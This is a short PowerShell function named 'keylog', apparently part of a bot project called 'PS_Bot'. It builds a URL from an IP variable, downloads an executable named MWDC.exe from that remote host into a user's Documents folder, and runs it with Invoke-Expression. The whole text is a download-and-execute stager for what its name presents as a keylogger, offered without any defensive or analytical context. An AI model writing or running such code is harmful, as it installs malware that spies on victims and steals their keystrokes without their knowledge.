function keylog
{
    $output = "C:\Users\Dulgless\Documents\PowerShellScrits\MWDC.exe"
    $uri_exe="http://"
    $uri_exe+=$ip;
    $uri_exe+="/PS_Bot/MWDC.exe";
    $uri_exe
    Invoke-WebRequest -Uri $uri_exe -OutFile $output
    $output | Invoke-Expression
    $execute
}